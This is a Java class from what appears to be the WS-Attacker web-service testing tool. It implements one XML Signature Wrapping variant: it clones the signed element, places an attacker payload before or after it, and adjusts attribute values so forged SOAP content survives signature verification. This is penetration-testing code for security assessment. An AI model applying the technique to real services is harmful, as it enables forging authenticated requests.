package wsattacker.plugin.signatureWrapping.xpath.weakness;

import java.util.List;

import org.w3c.dom.Element;

import wsattacker.plugin.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.plugin.signatureWrapping.xpath.interfaces.XPathWeakness;
import wsattacker.plugin.signatureWrapping.xpath.parts.Step;
import wsattacker.plugin.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.plugin.signatureWrapping.xpath.weakness.util.XPathWeaknessTools;

/**
 * This Weakness is a Wrapper for the XPathAttributeWeaknessPostProcess.
 * Unlike XPathDescendantWeakness, this Weakness just clones the signed part
 * and places it directly before or after this element.
 * Afterwards, the XPathAttributeWeaknessPostProcess is used to modify
 * the attribute values.
 */
public class XPathAttributeWeakness implements XPathWeakness
{
  
  private XPathWeakness postProcess;
  private Step step;
  private int matches;
  
  
  public XPathAttributeWeakness(Step step,
                                 Element signedElement,
                                 Element payloadElement) throws InvalidWeaknessException
  {
    this.step = step;
    this.matches = XPathWeaknessTools.getSignedPostPart(step, signedElement).size();
    this.postProcess = new XPathAttributeWeaknessPostProcess(step);
  }

  @Override
  public int getNumberOfPossibilites()
  {
    // *2 : Place Payload before and after Signed Element
    // *matches : If XPath matches multiple Elements
    // *postProcess.getNumberOfPossibilities() : self explaining
    return 2 * matches * postProcess.getNumberOfPossibilites();
  }

  /**
   * Simply detects the affected element and clones it before or after the signed element.
   * Afterwards, the XPathAttributeWeaknessPostProcess is called.
   */
  @Override
  public void abuseWeakness(int index,
                            Element signedElement,
                            Element payloadElement)
                                                   throws InvalidWeaknessException
  {
    boolean before = (index % 2) == 0;
    index /= 2;
    int useMatch = index % matches;
    index /= matches;
    int abuseIndex = index % postProcess.getNumberOfPossibilites();
    
    List<Element> matches = XPathWeaknessTools.getSignedPostPart(step, signedElement);
    if (useMatch > matches.size())
      throw new InvalidWeaknessException("Could not find index " + useMatch  + " in attribute XPath matches.");
    Element signedPostPart = matches.get(useMatch);
    // Use subfunction from XPathDescendantWeakness to create the payload
    Element payloadPostPart = XPathWeaknessTools.createPayloadPostPart(signedPostPart, signedElement, payloadElement);
    if (before) {
      WeaknessLog.append("Inserted Payload just before " + signedPostPart.getNodeName());
      signedPostPart.getParentNode().insertBefore(payloadPostPart, signedPostPart);
    }
    else {
      WeaknessLog.append("Inserted Payload after " + signedPostPart.getNodeName());
      signedPostPart.getParentNode().appendChild(payloadPostPart);
    }
    // call post process
    postProcess.abuseWeakness(abuseIndex, signedElement, payloadElement);
  }

}
